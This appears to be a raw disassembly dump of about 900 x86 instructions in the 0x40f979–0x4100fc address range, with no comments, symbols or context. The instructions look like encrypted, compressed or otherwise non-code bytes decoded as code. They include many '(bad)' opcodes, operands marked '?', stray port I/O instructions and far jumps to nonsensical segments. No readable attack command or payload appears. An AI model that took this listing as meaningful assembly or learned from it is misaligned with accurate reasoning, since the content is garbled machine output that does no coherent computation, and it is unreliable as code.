  40f979:	push   ss
  40f97a:	add    al,0xe5
  40f97c:	push   0xf9d5ebac
  40f981:	out    0x77,eax
  40f983:	jp     0x40f99c
  40f985:	xchg   BYTE PTR ss:[edx+0x3c],ah
  40f989:	aas    
  40f98a:	gs stos BYTE PTR es:[edi],al
  40f98c:	mov    WORD PTR [eax],ds
  40f98e:	mov    al,ds:0x8dcdacad
  40f993:	out    0xdb,eax
  40f995:	lods   eax,DWORD PTR ds:[esi]
  40f996:	or     al,0xa2
  40f998:	test   eax,0xab5d5504
  40f99d:	ja     0x40f96a
  40f99f:	mov    ah,0xe4
  40f9a1:	jecxz  0x40f9ad
  40f9a3:	aam    0x7a
  40f9a5:	popa   
  40f9a6:	cwde   
  40f9a7:	pop    ds
  40f9a8:	inc    esp
  40f9a9:	xor    ah,BYTE PTR [ecx+0x36]
  40f9ac:	cmp    edx,edi
  40f9ae:	dec    ebx
  40f9af:	ss xchg ecx,eax
  40f9b1:	add    DWORD PTR [ebp+0xb022a26],edi
  40f9b7:	inc    esi
  40f9b8:	popa   
  40f9b9:	xchg   BYTE PTR [edi-0x53],ah
  40f9bc:	mov    eax,0x30d8e482
  40f9c1:	or     DWORD PTR [ecx],edi
  40f9c3:	jns    0x40f9be
  40f9c5:	xchg   edx,eax
  40f9c6:	cmp    eax,0x842602f5
  40f9cb:	sti    
  40f9cc:	jns    0x40f9d1
  40f9ce:	push   esp
  40f9cf:	stc    
  40f9d0:	sub    BYTE PTR fs:[eax-0x71],0xb8
  40f9d5:	and    BYTE PTR [eax-0x1fd323e5],0xc3
  40f9dc:	outs   dx,BYTE PTR ds:[esi]
  40f9dd:	push   es
  40f9de:	imul   ebp,DWORD PTR [ebp+0x1ab84c1c],0xbc4ffad4
  40f9e8:	xchg   ecx,eax
  40f9e9:	pop    edi
  40f9ea:	adc    dl,cl
  40f9ec:	mov    al,0x51
  40f9ee:	mov    ch,BYTE PTR [esi+0x55756575]
  40f9f4:	rcr    BYTE PTR [ebp+0x474e5567],cl
  40f9fa:	dec    ebx
  40f9fb:	daa    
  40f9fc:	xchg   esi,eax
  40f9fd:	xchg   al,cl
  40f9ff:	ss inc eax
  40fa01:	dec    eax
  40fa02:	sub    BYTE PTR [edi],al
  40fa04:	adc    DWORD PTR [edx],ebx
  40fa06:	ins    BYTE PTR es:[edi],dx
  40fa07:	mov    BYTE PTR [edi],bh
  40fa09:	shl    esi,cl
  40fa0b:	(bad)  
  40fa0c:	dec    eax
  40fa0d:	outs   dx,BYTE PTR ds:[esi]
  40fa0e:	leave  
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	mov    edi,gs
  40fa12:	xchg   ebp,eax
  40fa13:	jns    0x40f9e1
  40fa15:	xchg   esp,eax
  40fa16:	jo     0x40f9ff
  40fa18:	sbb    BYTE PTR [edi+eax*1],ah
  40fa1b:	ins    DWORD PTR es:[edi],dx
  40fa1c:	stos   BYTE PTR es:[edi],al
  40fa1d:	cmp    DWORD PTR [ecx+0x62],esp
  40fa20:	xchg   ebp,eax
  40fa21:	(bad)  
  40fa23:	mov    esp,0x10ff19bb
  40fa28:	or     DWORD PTR [ecx],eax
  40fa2a:	data16 clc 
  40fa2c:	mov    eax,0x4ddf5f2d
  40fa31:	mov    ebp,0x835f9d56
  40fa36:	ss js  0x40fa0b
  40fa39:	test   BYTE PTR [ebx-0x57],bl
  40fa3c:	es jg  0x40fa51
  40fa3f:	dec    ebx
  40fa40:	dec    esp
  40fa41:	add    DWORD PTR [edx+eax*4+0x38e8bdf2],esp
  40fa48:	inc    ebx
  40fa49:	and    al,0xaa
  40fa4b:	jmp    0xffd:0xfad4f65
  40fa52:	jge    0x40fa88
  40fa54:	loope  0x40fa6d
  40fa56:	aad    0x51
  40fa58:	jae    0x40fac9
  40fa5a:	jl     0x40faa1
  40fa5c:	push   eax
  40fa5d:	clc    
  40fa5e:	xchg   edx,eax
  40fa5f:	mov    ah,0xdd
  40fa61:	xchg   esp,eax
  40fa62:	ja     0x40fa47
  40fa64:	jmp    0xdf9f8ee4
  40fa69:	mov    ebp,0xb482dba6
  40fa6e:	stos   BYTE PTR es:[di],al
  40fa70:	add    eax,0xd33460de
  40fa75:	xchg   ecx,eax
  40fa76:	or     BYTE PTR [eax],al
  40fa78:	inc    edx
  40fa79:	sub    eax,0x1f151186
  40fa7e:	call   0x17db:0x9e6675fd
  40fa85:	mov    eax,ds:0x7f76815e
  40fa8a:	or     eax,0xe5b80467
  40fa8f:	sub    ebx,DWORD PTR [ebp-0x26]
  40fa92:	sub    eax,0x37c39b48
  40fa97:	retf   
  40fa98:	inc    esi
  40fa99:	push   esp
  40fa9a:	stc    
  40fa9b:	adc    al,0x85
  40fa9d:	adc    DWORD PTR [ebx+edi*1-0x6c589941],esp
  40faa4:	ins    DWORD PTR es:[edi],dx
  40faa5:	mov    esp,0x10292e78
  40faaa:	(bad)  
  40faab:	nop
  40faac:	lds    edx,FWORD PTR [esi-0x4]
  40faaf:	and    DWORD PTR [eax+ebx*4],edx
  40fab2:	js     0x40fac5
  40fab4:	movhps xmm3,QWORD PTR [edi+edi*4+0x13bd4f]
  40fabc:	fwait
  40fabd:	sbb    BYTE PTR [ebp+0x4c],bl
  40fac0:	push   cs
  40fac1:	shl    BYTE PTR [edx+0x60affcf4],cl
  40fac7:	out    dx,al
  40fac8:	icebp  
  40fac9:	xchg   esi,eax
  40faca:	jne    0x40fa6e
  40facc:	push   ss
  40facd:	mov    edx,0x19d704aa
  40fad2:	push   cs
  40fad3:	mov    dh,0x8e
  40fad5:	sbb    al,0xd3
  40fad7:	push   ss
  40fad8:	adc    esp,DWORD PTR [ecx+0x2a]
  40fadb:	pop    ds
  40fadc:	daa    
  40fadd:	mov    bh,0xba
  40fadf:	or     cl,BYTE PTR [edx+0x2a]
  40fae2:	rcl    DWORD PTR [edx-0x5a],1
  40fae5:	aaa    
  40fae6:	mov    ah,0x34
  40fae8:	shr    DWORD PTR [eax+eax*8-0xe],cl
  40faec:	in     al,0xf7
  40faee:	inc    ebp
  40faef:	aad    0xec
  40faf1:	je     0x40faf9
  40faf3:	push   ss
  40faf4:	push   edi
  40faf5:	cld    
  40faf6:	shl    DWORD PTR [edi],1
  40faf8:	out    0x63,eax
  40fafa:	mov    esp,0x33fb28d
  40faff:	jno    0x40fafd
  40fb01:	loope  0x40faba
  40fb03:	xchg   edx,eax
  40fb04:	outs   dx,DWORD PTR ds:[esi]
  40fb05:	adc    al,0x31
  40fb07:	pop    es
  40fb08:	sub    BYTE PTR gs:[edx],bl
  40fb0b:	into   
  40fb0c:	loope  0x40fab1
  40fb0e:	mov    DWORD PTR [eax+0x60506d28],ebp
  40fb14:	rcr    BYTE PTR [edx+0x2e],1
  40fb17:	dec    edi
  40fb18:	add    al,dh
  40fb1a:	or     ebp,DWORD PTR [eax+eiz*4-0x7b]
  40fb1e:	das    
  40fb1f:	paddusb mm4,QWORD PTR [ebp+0xe]
  40fb23:	sbb    edx,DWORD PTR [eax-0x80]
  40fb26:	ss int3 
  40fb28:	add    eax,0xc3743746
  40fb2d:	inc    ecx
  40fb2e:	imul   ebp,edi,0x482bec6a
  40fb34:	jg     0x40fba9
  40fb36:	ja     0x40fb49
  40fb38:	and    bh,BYTE PTR [ebp*8-0x4e648488]
  40fb3f:	xchg   dh,dl
  40fb41:	std    
  40fb42:	or     esp,esp
  40fb44:	rol    BYTE PTR [ebp+0x6b7fd858],0x48
  40fb4b:	sbb    DWORD PTR [ebp+0x7012a403],edx
  40fb51:	sbb    BYTE PTR es:[edx-0x9],al
  40fb55:	ja     0x40fade
  40fb57:	mov    eax,ds:0xfac2d8d1
  40fb5c:	mov    cl,0x98
  40fb5e:	int3   
  40fb5f:	std    
  40fb60:	push   ss
  40fb61:	sub    edx,DWORD PTR [ebx]
  40fb63:	xor    al,BYTE PTR [eax-0x569e8dea]
  40fb69:	mov    DWORD PTR [ebx+0x1a31c15f],ebx
  40fb6f:	sahf   
  40fb70:	int3   
  40fb71:	mov    ah,0x89
  40fb73:	imul   ecx,esp,0xffffffbb
  40fb76:	mov    dh,BYTE PTR [ecx+0x31aaf70b]
  40fb7c:	in     eax,0x85
  40fb7e:	sub    ch,bl
  40fb80:	js     0x40fbae
  40fb82:	pop    ecx
  40fb83:	jmp    DWORD PTR [ebx]
  40fb85:	jo     0x40fb62
  40fb87:	repz das 
  40fb89:	jmp    0x3c34:0x42f4669c
  40fb90:	adc    bh,BYTE PTR [edi]
  40fb92:	pop    esi
  40fb93:	cmp    eax,0xc2966c79
  40fb98:	cmp    esi,0xede56932
  40fb9e:	in     al,0x9e
  40fba0:	jecxz  0x40fb84
  40fba2:	jnp    0x40fc00
  40fba4:	rol    DWORD PTR [edx],cl
  40fba6:	lahf   
  40fba7:	fwait
  40fba8:	pushf  
  40fba9:	outs   dx,DWORD PTR ds:[esi]
  40fbaa:	mov    ebx,0x1ebda818
  40fbaf:	and    ah,BYTE PTR [eax+ecx*8+0x1a]
  40fbb3:	sbb    esi,ecx
  40fbb5:	ret    0x2b63
  40fbb8:	lods   eax,DWORD PTR ds:[esi]
  40fbb9:	adc    DWORD PTR [edx],edi
  40fbbb:	mov    ch,0x5b
  40fbbd:	sbb    DWORD PTR [ecx-0x4221331f],ebx
  40fbc3:	lods   eax,DWORD PTR ds:[esi]
  40fbc4:	dec    esp
  40fbc5:	inc    ecx
  40fbc6:	ins    DWORD PTR es:[edi],dx
  40fbc7:	loope  0x40fb9b
  40fbc9:	or     eax,esp
  40fbcb:	pop    es
  40fbcc:	jae    0x40fb74
  40fbce:	mov    ds:0xe39a3f72,al
  40fbd3:	and    dh,BYTE PTR [edi]
  40fbd5:	fadd   QWORD PTR [ebp+0x13a03544]
  40fbdb:	mov    eax,0xa3719c22
  40fbe0:	mov    ecx,0xb3699c6c
  40fbe5:	xchg   esi,eax
  40fbe6:	adc    bl,BYTE PTR [ebx]
  40fbe8:	mov    ds:0xc76c3e3e,al
  40fbed:	pcmpeqw mm2,QWORD PTR [ebp+0x31]
  40fbf1:	mov    ecx,0xc615b0ef
  40fbf6:	push   esi
  40fbf7:	sbb    al,0x9c
  40fbf9:	(bad)  
  40fbfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbfb:	mov    eax,0x527cbb52
  40fc00:	inc    esp
  40fc01:	adc    ecx,DWORD PTR [ecx+esi*8-0x4f]
  40fc05:	lea    ecx,[edx-0x62]
  40fc08:	cmp    cl,dh
  40fc0a:	push   ecx
  40fc0b:	sbb    DWORD PTR [eax-0x71158a57],ecx
  40fc11:	pusha  
  40fc12:	and    eax,0xc7af6381
  40fc17:	les    edx,FWORD PTR [edi-0x10dc3914]
  40fc1d:	sbb    esp,eax
  40fc1f:	cdq    
  40fc20:	and    ebp,DWORD PTR ds:0x1b12fa7b
  40fc26:	jmp    0x36c3:0x4ba650b8
  40fc2d:	lock mov eax,0xda8c4d63
  40fc33:	enter  0x6da9,0x60
  40fc37:	popa   
  40fc38:	jo     0x40fc70
  40fc3a:	mov    edx,0xaa8d580e
  40fc3f:	fst    DWORD PTR [ebx*1-0x60107ac2]
  40fc46:	(bad)  
  40fc47:	inc    ebx
  40fc48:	pop    esi
  40fc49:	lahf   
  40fc4a:	dec    eax
  40fc4b:	xchg   esi,eax
  40fc4c:	dec    ebx
  40fc4d:	pop    es
  40fc4e:	icebp  
  40fc4f:	ins    BYTE PTR es:[edi],dx
  40fc50:	fdiv   DWORD PTR [eax-0xf]
  40fc53:	ret    
  40fc54:	inc    edx
  40fc55:	adc    al,0xa7
  40fc57:	push   es
  40fc58:	ror    esp,1
  40fc5a:	ins    BYTE PTR es:[di],dx
  40fc5c:	hlt    
  40fc5d:	adc    bl,BYTE PTR [esi]
  40fc5f:	or     dh,dl
  40fc61:	shl    ecx,0xad
  40fc64:	scas   al,BYTE PTR es:[edi]
  40fc65:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40fc67:	dec    edi
  40fc68:	inc    edi
  40fc69:	sub    al,0xfe
  40fc6b:	aad    0xb9
  40fc6d:	add    al,BYTE PTR [ecx+0x6185363b]
  40fc73:	ja     0x40fc62
  40fc75:	adc    BYTE PTR [esi-0x6a16af51],0x34
  40fc7c:	scas   eax,DWORD PTR es:[edi]
  40fc7d:	push   edx
  40fc7e:	mov    ebp,0xb07a95b1
  40fc83:	xchg   ebp,eax
  40fc84:	xchg   DWORD PTR [esi+0x5dc7209d],edx
  40fc8a:	loop   0x40fc25
  40fc8c:	lock jp 0x40fc79
  40fc8f:	xor    BYTE PTR [esp+esi*8+0x24db6f02],bh
  40fc96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc97:	mov    dh,0x63
  40fc99:	and    al,0x2e
  40fc9b:	bound  esi,QWORD PTR [edx+0xc0acdde]
  40fca1:	test   eax,0x8c0981b1
  40fca6:	dec    ebp
  40fca7:	sub    dl,al
  40fca9:	push   eax
  40fcaa:	es sub al,0x7
  40fcad:	shr    DWORD PTR [ecx+0x7e3c4e1a],1
  40fcb3:	mov    cl,0xc8
  40fcb5:	std    
  40fcb6:	inc    eax
  40fcb7:	add    al,BYTE PTR [edx]
  40fcb9:	push   eax
  40fcba:	shl    DWORD PTR [edx],1
  40fcbc:	imul   esp,eax,0xffffff9f
  40fcbf:	mov    eax,0x773f2f99
  40fcc4:	sbb    al,0xab
  40fcc6:	sub    edi,DWORD PTR [eax+edi*4-0x7d6c1746]
  40fccd:	or     eax,0x2aea40ff
  40fcd2:	stc    
  40fcd3:	iret   
  40fcd4:	push   esp
  40fcd5:	xor    eax,0xf8007811
  40fcda:	xlat   BYTE PTR ds:[ebx]
  40fcdb:	pop    ebp
  40fcdc:	or     edx,ecx
  40fcde:	ins    BYTE PTR es:[edi],dx
  40fcdf:	seta   BYTE PTR [edi-0x63]
  40fce3:	mov    edx,0x878f5e4f
  40fce8:	sti    
  40fce9:	ss cmp esp,ecx
  40fcec:	fiadd  DWORD PTR [ecx]
  40fcee:	imul   ebx,edi,0x806c5e8f
  40fcf4:	pop    ebx
  40fcf5:	lea    esi,[edx-0x3e0ecb6a]
  40fcfb:	lods   al,BYTE PTR ds:[esi]
  40fcfc:	arpl   WORD PTR [ecx-0x21],si
  40fcff:	mov    esi,0x1de774e2
  40fd04:	add    DWORD PTR [edx+0x428690cc],esi
  40fd0a:	js     0x40fd64
  40fd0c:	adc    al,0x3
  40fd0e:	cs stc 
  40fd10:	aas    
  40fd11:	iret   
  40fd12:	jmp    0x4bab:0x30c527db
  40fd19:	jle    0x40fd93
  40fd1b:	add    eax,0x12bc0b19
  40fd20:	je     0x40fcba
  40fd22:	fs jmp 0xb42465e7
  40fd28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd29:	(bad)  
  40fd2a:	fs clc 
  40fd2c:	mov    esi,0x47c88a2
  40fd31:	adc    al,0x15
  40fd33:	mov    esp,es
  40fd35:	and    cl,BYTE PTR [edi-0x58039d1b]
  40fd3b:	add    eax,0x3a6bea27
  40fd40:	or     bh,ch
  40fd42:	xchg   esi,eax
  40fd43:	aaa    
  40fd44:	pop    ds
  40fd45:	fstp   QWORD PTR ds:0x60af0106
  40fd4b:	and    ah,BYTE PTR [ebp+0x71c99d5e]
  40fd51:	jmp    0x40fd7d
  40fd53:	xchg   ecx,ebx
  40fd55:	jmp    0x40fd5b
  40fd57:	cmp    edi,DWORD PTR [edi-0x2bdb3dc3]
  40fd5d:	dec    edx
  40fd5e:	sti    
  40fd5f:	ja     0x40fd29
  40fd61:	fdivr  QWORD PTR [edx]
  40fd63:	and    al,0xe3
  40fd65:	mov    ebp,0x73a1c80f
  40fd6a:	sahf   
  40fd6b:	mov    esi,0xda336b5e
  40fd70:	les    esi,FWORD PTR [eax-0x6d]
  40fd73:	loope  0x40fd69
  40fd75:	addr16 arpl sp,cx
  40fd78:	ss ds sbb eax,0xb3108f9a
  40fd7f:	adc    dl,BYTE PTR [ebp-0x4e]
  40fd82:	mov    eax,0x3792c5f4
  40fd87:	fwait
  40fd88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd89:	rol    bh,cl
  40fd8b:	push   0x4900f873
  40fd90:	retf   0x605
  40fd93:	adc    ebx,DWORD PTR [edx]
  40fd95:	pop    ds
  40fd96:	mov    ds:0xcee34516,al
  40fd9b:	(bad)  
  40fd9c:	mov    edi,0x6e34a50e
  40fda1:	sbb    al,0x42
  40fda3:	not    DWORD PTR [ebx+0x40]
  40fda6:	pop    esi
  40fda7:	sub    dh,BYTE PTR [ecx]
  40fda9:	lods   al,BYTE PTR ds:[esi]
  40fdaa:	and    eax,0x34cef152
  40fdaf:	pop    ebp
  40fdb0:	inc    ebx
  40fdb1:	stos   DWORD PTR es:[edi],eax
  40fdb2:	push   eax
  40fdb3:	mov    WORD PTR [esp+edx*1+0x458b6e60],?
  40fdba:	mov    ds:0xbd557703,eax
  40fdbf:	lahf   
  40fdc0:	nop
  40fdc1:	pop    edx
  40fdc2:	mov    dh,BYTE PTR [esi+0x1b]
  40fdc5:	popf   
  40fdc6:	mov    esi,0xb627653b
  40fdcb:	in     al,0x60
  40fdcd:	je     0x40fda4
  40fdcf:	cmp    ecx,DWORD PTR ds:0x9a889ec8
  40fdd5:	xchg   ecx,eax
  40fdd6:	or     dh,BYTE PTR [edx-0x77]
  40fdd9:	inc    eax
  40fdda:	dec    ebx
  40fddb:	repnz loope 0x40fe15
  40fdde:	jmp    0xfca450e5
  40fde3:	mov    esp,0xdf9ff42d
  40fde8:	ins    BYTE PTR es:[edi],dx
  40fde9:	push   esi
  40fdea:	cwde   
  40fdeb:	push   esi
  40fdec:	repnz mov BYTE PTR [edx+0x2f5b7389],bl
  40fdf3:	jcxz   0x40fddc
  40fdf6:	fst    st(6)
  40fdf8:	inc    ebx
  40fdf9:	jmp    0x40fe74
  40fdfb:	popf   
  40fdfc:	dec    edi
  40fdfd:	push   0xefadf898
  40fe02:	test   al,0xd0
  40fe04:	stos   BYTE PTR es:[edi],al
  40fe05:	mov    bl,dl
  40fe07:	out    dx,al
  40fe08:	adc    cl,BYTE PTR [ecx-0x62]
  40fe0b:	cdq    
  40fe0c:	adc    eax,ebp
  40fe0e:	or     DWORD PTR ds:0x2ced13f,ebx
  40fe14:	add    ebx,DWORD PTR [ebp+0x1ec22043]
  40fe1a:	stc    
  40fe1b:	jae    0x40fdc4
  40fe1d:	scas   eax,DWORD PTR es:[edi]
  40fe1e:	jae    0x40fe23
  40fe20:	dec    ecx
  40fe21:	add    esi,DWORD PTR [esi-0x68bfcca8]
  40fe27:	gs ret 
  40fe29:	push   esp
  40fe2a:	(bad)  
  40fe2b:	div    DWORD PTR [esi-0x48]
  40fe2e:	stc    
  40fe2f:	aaa    
  40fe30:	in     eax,0xa7
  40fe32:	int    0x3f
  40fe34:	into   
  40fe35:	push   cs
  40fe36:	outs   dx,DWORD PTR ds:[esi]
  40fe37:	hlt    
  40fe38:	jmp    0x8caa:0x8d9448fa
  40fe3f:	push   0x74
  40fe41:	or     BYTE PTR [edi+0x2b],0x48
  40fe45:	jp     0x40fe38
  40fe47:	lahf   
  40fe48:	shr    al,cl
  40fe4a:	jmp    0xa4fb:0x2b04e2a5
  40fe51:	or     eax,0xd7de12a9
  40fe56:	loopne 0x40fec4
  40fe58:	inc    eax
  40fe59:	adc    cl,BYTE PTR ds:0x9791de7e
  40fe5f:	mov    al,ds:0x31de2b80
  40fe64:	jle    0x40fe58
  40fe66:	icebp  
  40fe67:	jne    0x40fe55
  40fe69:	and    ch,dh
  40fe6b:	and    ebp,DWORD PTR [esi+0x205c3272]
  40fe71:	jb     0x40fe92
  40fe73:	mov    ebx,0xa3a6deb6
  40fe78:	cmc    
  40fe79:	sahf   
  40fe7a:	or     BYTE PTR [eax-0x70],bl
  40fe7d:	jmp    0xfefe:0x437ba11c
  40fe84:	in     al,0xba
  40fe86:	in     eax,dx
  40fe87:	dec    eax
  40fe88:	mov    ds:0xc9a78575,al
  40fe8d:	mov    eax,0x114db956
  40fe92:	hlt    
  40fe93:	sbb    ah,BYTE PTR [esi]
  40fe95:	and    ebp,ebp
  40fe97:	mov    esi,es
  40fe99:	int3   
  40fe9a:	(bad)  
  40fe9b:	fadd   st,st(1)
  40fe9d:	in     eax,dx
  40fe9e:	imul   esi,DWORD PTR [edx-0x6ef11dee],0x43
  40fea5:	lods   al,BYTE PTR ds:[esi]
  40fea6:	mov    DWORD PTR [edx],0x86ab7520
  40feac:	jae    0x40fec3
  40feae:	lahf   
  40feaf:	mov    edi,0xc87c378c
  40feb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feb5:	out    0xbd,al
  40feb7:	sub    dh,BYTE PTR [eax+edx*2]
  40feba:	dec    ebp
  40febb:	jo     0x40fecd
  40febd:	xor    al,0x68
  40febf:	mov    edi,0xe8febb2a
  40fec4:	test   al,0x80
  40fec6:	sar    ch,1
  40fec8:	outs   dx,BYTE PTR ds:[esi]
  40fec9:	dec    esi
  40feca:	adc    BYTE PTR [eax+0x37889118],bl
  40fed0:	xchg   esi,eax
  40fed1:	cld    
  40fed2:	cmp    ebp,DWORD PTR [edi]
  40fed4:	mov    ch,0xd2
  40fed6:	nop
  40fed7:	stos   BYTE PTR es:[edi],al
  40fed8:	xchg   esp,eax
  40fed9:	jbe    0x40fe94
  40fedb:	in     eax,0x32
  40fedd:	xlat   BYTE PTR ds:[ebx]
  40fede:	cld    
  40fedf:	sbb    edi,DWORD PTR [eax+0x89c6011]
  40fee5:	and    BYTE PTR [esi],dl
  40fee7:	mov    DWORD PTR [eax+0x2bb406a0],esi
  40feed:	xlat   BYTE PTR ds:[ebx]
  40feee:	mov    edx,0x831114da
  40fef3:	ds sbb ah,0x6e
  40fef7:	xchg   esp,eax
  40fef8:	jp     0x40ff15
  40fefa:	adc    BYTE PTR es:[ebx],0xcb
  40fefe:	fldcw  WORD PTR [edi-0x1fb518b9]
  40ff04:	bound  esp,QWORD PTR [ebx]
  40ff06:	ins    DWORD PTR es:[edi],dx
  40ff07:	sbb    BYTE PTR [edi+0x6f],dl
  40ff0a:	mov    ds:0x5f397d75,al
  40ff0f:	ds repz push eax
  40ff12:	cwde   
  40ff13:	cmp    al,0x5
  40ff15:	push   0xa1816a75
  40ff1a:	loopne 0x40ff13
  40ff1c:	push   edx
  40ff1d:	fstp   DWORD PTR [ebp+0x3991a9f7]
  40ff23:	das    
  40ff24:	jg     0x40ff3f
  40ff26:	enter  0x45d7,0x90
  40ff2a:	pop    edx
  40ff2b:	out    dx,eax
  40ff2c:	dec    eax
  40ff2d:	jb     0x40fec5
  40ff2f:	je     0x40ff11
  40ff31:	jb     0x40ff01
  40ff33:	dec    ebp
  40ff34:	pop    ebx
  40ff35:	in     al,dx
  40ff36:	int3   
  40ff37:	jmp    0x40ff2f
  40ff39:	and    al,0xe9
  40ff3b:	into   
  40ff3c:	mov    ebp,0x19404e3d
  40ff41:	call   0xb4975359
  40ff46:	in     eax,dx
  40ff47:	sti    
  40ff48:	fist   DWORD PTR [edi-0x71]
  40ff4b:	jo     0x40ff0e
  40ff4d:	pushf  
  40ff4e:	bound  esi,QWORD PTR [ebp-0x13]
  40ff51:	lahf   
  40ff52:	inc    eax
  40ff53:	lea    ecx,[esi+edi*1-0x1660d56c]
  40ff5a:	in     eax,dx
  40ff5b:	or     DWORD PTR [ebx*4-0x7ed43e63],esi
  40ff62:	sbb    al,0xbc
  40ff64:	imul   ebp,edi,0x6a
  40ff67:	jae    0x40ff48
  40ff69:	loope  0x40ffd2
  40ff6b:	arpl   WORD PTR [edi+edi*2+0x69],si
  40ff6f:	sar    eax,cl
  40ff71:	clc    
  40ff72:	jmp    0x7c4acd5d
  40ff77:	fisttp QWORD PTR [esi-0x18]
  40ff7a:	mov    al,ds:0xbd29ef5
  40ff7f:	retf   0x2193
  40ff82:	iret   
  40ff83:	popa   
  40ff84:	mov    dh,0x5b
  40ff86:	lea    edx,[esi]
  40ff88:	add    al,0x90
  40ff8a:	sahf   
  40ff8b:	shr    BYTE PTR [eax+0x2],0xde
  40ff8f:	(bad)  
  40ff90:	in     eax,dx
  40ff91:	sbb    ebx,DWORD PTR [ebx+0xea7c18]
  40ff97:	addr16 mov ebp,0x2f655fa6
  40ff9d:	cmp    bh,BYTE PTR [edx-0x51]
  40ffa0:	xchg   ah,bh
  40ffa2:	jmp    0x40ff33
  40ffa4:	jl     0x40ff52
  40ffa6:	cs dec esi
  40ffa8:	arpl   WORD PTR [ecx+0x2c356a81],ax
  40ffae:	pop    ebp
  40ffaf:	inc    DWORD PTR [esi-0x6ffc1d2f]
  40ffb5:	mov    ds:0x99a506e3,eax
  40ffba:	cmp    ebp,DWORD PTR [edx+0x57]
  40ffbd:	add    esp,DWORD PTR [ecx]
  40ffbf:	clc    
  40ffc0:	push   esi
  40ffc1:	test   DWORD PTR [ebp-0x5463284],ebp
  40ffc7:	sbb    al,0xfe
  40ffc9:	ss es cs inc edx
  40ffcd:	(bad)  
  40ffce:	lods   al,BYTE PTR ds:[esi]
  40ffcf:	frstor [edx]
  40ffd1:	(bad)  
  40ffd4:	cmp    esi,DWORD PTR [ebp+0x5f82b2ea]
  40ffda:	addr16 sub edx,ecx
  40ffdd:	mov    ebx,0x96009701
  40ffe2:	call   DWORD PTR [edi]
  40ffe4:	mov    bl,0xf4
  40ffe6:	call   0xee1a:0x6b4f8761
  40ffed:	(bad)  
  40ffee:	out    0x28,al
  40fff0:	add    DWORD PTR [ecx-0x1d],ecx
  40fff3:	imul   esp,DWORD PTR [edx+0x3b],0xb2f35771
  40fffa:	ret    0xbc7a
  40fffd:	push   es
  40fffe:	inc    ecx
  40ffff:	mov    bh,0x9a
  410001:	mov    al,bh
  410003:	ins    DWORD PTR es:[edi],dx
  410004:	test   DWORD PTR [eax],esp
  410006:	mov    ah,0xdc
  410008:	sahf   
  410009:	outs   dx,BYTE PTR ds:[esi]
  41000a:	(bad)  
  41000b:	neg    BYTE PTR [eax+0x71513b4e]
  410011:	xor    edx,esi
  410013:	xlat   BYTE PTR ds:[ebx]
  410014:	pop    ebp
  410015:	adc    ebx,DWORD PTR [eax+0x7a2c4581]
  41001b:	dec    esi
  41001c:	fisubr WORD PTR [ecx+esi*2+0x416fbe88]
  410023:	xchg   esi,eax
  410024:	jmp    0xacc3:0x489a9c76
  41002b:	aad    0x6e
  41002d:	pop    edx
  41002e:	popa   
  41002f:	lds    esp,FWORD PTR [ecx-0x1a]
  410032:	mov    edi,0xf77b2780
  410037:	pop    edi
  410038:	jo     0x410092
  41003a:	cmp    BYTE PTR [ebp-0x68],bl
  41003d:	push   ecx
  41003e:	mov    ebp,0x47b382c1
  410043:	repz or eax,0x44752a13
  410049:	ins    DWORD PTR es:[edi],dx
  41004a:	sub    bl,BYTE PTR [eax]
  41004c:	icebp  
  41004d:	repz loope 0x41003c
  410050:	jmp    0xb0d0cfd4
  410055:	add    cl,ch
  410057:	dec    esi
  410058:	lock scas eax,DWORD PTR es:[edi]
  41005a:	lds    ebp,FWORD PTR [ecx-0x15a8a672]
  410060:	daa    
  410061:	pop    eax
  410062:	mov    ?,WORD PTR [edi-0x9]
  410065:	imul   esi,DWORD PTR [esi-0x1c],0xfffffffe
  410069:	inc    ebp
  41006a:	adc    dl,ch
  41006c:	xchg   esi,eax
  41006d:	fistp  WORD PTR [eax-0x18c483c5]
  410073:	mov    BYTE PTR [edi+ecx*8],ah
  410076:	pushf  
  410077:	lock xchg edi,eax
  410079:	repz dec al
  41007c:	enter  0xbf50,0xd7
  410080:	ret    
  410081:	push   ds
  410082:	scas   eax,DWORD PTR es:[edi]
  410083:	in     eax,0xa8
  410085:	leave  
  410086:	or     BYTE PTR [ecx+0x2d8a1b0],0x19
  41008d:	(bad)  
  41008e:	clc    
  41008f:	dec    ecx
  410090:	iret   
  410091:	jbe    0x410094
  410093:	pop    ebx
  410094:	inc    esi
  410095:	dec    ebp
  410096:	and    ecx,DWORD PTR [edx-0x18]
  410099:	outs   dx,BYTE PTR ds:[esi]
  41009a:	jnp    0x41001e
  41009c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41009d:	and    al,0xe4
  41009f:	jmp    0x410040
  4100a1:	jmp    0x6233:0xd470865
  4100a8:	pop    ss
  4100a9:	adc    dl,BYTE PTR [edi]
  4100ab:	es xor al,0xee
  4100ae:	cs jmp 0x52e6:0x5241d0ce
  4100b6:	clc    
  4100b7:	sbb    al,0xd4
  4100b9:	mov    bl,0xb9
  4100bb:	inc    ebx
  4100bc:	or     edi,eax
  4100be:	mov    ebx,0x7c59a11e
  4100c3:	pop    edx
  4100c4:	jnp    0x410082
  4100c6:	xchg   ebx,eax
  4100c7:	mov    DWORD PTR [esi],edx
  4100c9:	sbb    ah,BYTE PTR ss:[edi+eiz*4+0x3f]
  4100ce:	shld   edi,ebx,0x9d
  4100d2:	xor    ah,BYTE PTR [edi+ebx*4+0x745ebff9]
  4100d9:	cmp    DWORD PTR [edx+0x60],ebp
  4100dc:	xchg   esp,eax
  4100dd:	(bad)  
  4100de:	pop    ss
  4100df:	out    dx,al
  4100e0:	enter  0x132e,0x36
  4100e4:	fwait
  4100e5:	jmp    0x4100e2
  4100e7:	pop    edx
  4100e8:	mov    BYTE PTR [eax-0x71],bh
  4100eb:	out    0x5f,al
  4100ed:	xchg   ecx,eax
  4100ee:	lods   al,BYTE PTR ds:[esi]
  4100ef:	ret    
  4100f0:	add    ebp,DWORD PTR [ebx-0x22]
  4100f3:	xlat   BYTE PTR ds:[ebx]
  4100f4:	jae    0x410108
  4100f6:	mov    bl,0xd1
  4100f8:	sub    al,0x4d
  4100fa:	xchg   ecx,eax
  4100fb:	push   ebx
  4100fc:	stc    
